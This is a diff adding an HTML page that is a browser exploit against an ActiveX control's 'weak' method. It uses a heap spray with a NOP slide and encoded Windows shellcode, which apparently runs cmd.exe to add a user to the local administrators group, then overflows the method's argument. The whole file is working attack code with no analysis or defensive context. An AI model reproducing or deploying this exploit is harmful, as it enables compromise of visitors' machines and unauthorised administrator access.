@@ -1,0 +1,35 @@
+
+<html>
+  <head>
+    <object id="Tester" classid='clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687'></object>
+  </head>
+  <body>
+  <script>
+   
+var shellcode = unescape('%uc031%u6850%u696e%u6c65%u4468%u4420%u6861%u2f20%u4441%u7468%u726f%u6873%u7473%u6172%u6d68%u6e69%u6869%u2070%u6441%u6768%u6f72%u6875%u636f%u6c61%u6568%u2074%u686c%u2626%u6e20%u4468%u2044%u6820%u2035%u412f%u3168%u3332%u6834%u6569%u206c%u2068%u6144%u686e%u7375%u7265%u6e68%u7465%u6820%u632f%u2020%u6568%u6578%u6820%u6d63%u2e64%ue089%ubb50%u3231%u7c86%ud3ff%uc031%ubb50%ubfa2%u7c81%ud3ff');       
+    var nopslide = unescape('%u9090%u9090');
+     
+    var headersize = 20;
+    var block = headersize + shellcode.length;
+     
+    while (nopslide.length < block) nopslide += nopslide;
+    var fillblock = nopslide.substring(0,block);
+    var finalblock = nopslide.substring(0,nopslide.length - block);
+     
+    while (finalblock.length + block < 0x40000) finalblock = finalblock + finalblock + fillblock;
+    var memory = new Array();
+    for (i = 0; i < 1000; i++){ memory[i] = finalblock + shellcode }
+
+	
+    pointer='';
+    for (counter=0; counter<=80; counter++) pointer+=unescape("%06");
+    Tester.weak(pointer);
+      pointer='';
+    for (counter=0; counter<=80; counter++) pointer+=unescape("%05");
+    Tester.weak(pointer);
+	
+
+	
+  </script>
+</body>
+</html>
